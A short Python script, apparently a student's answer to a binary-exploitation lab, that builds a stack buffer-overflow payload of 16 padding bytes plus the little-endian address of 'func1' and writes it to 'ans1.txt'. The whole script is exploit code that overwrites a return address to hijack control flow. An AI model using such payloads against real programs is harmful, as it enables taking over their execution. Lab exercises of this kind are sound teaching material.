# build_payload.py
padding = b'A' * 16  # 8字节buffer + 8字节saved rbp
target_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00' # func1 的小端序地址

payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload has been written to ans1.txt")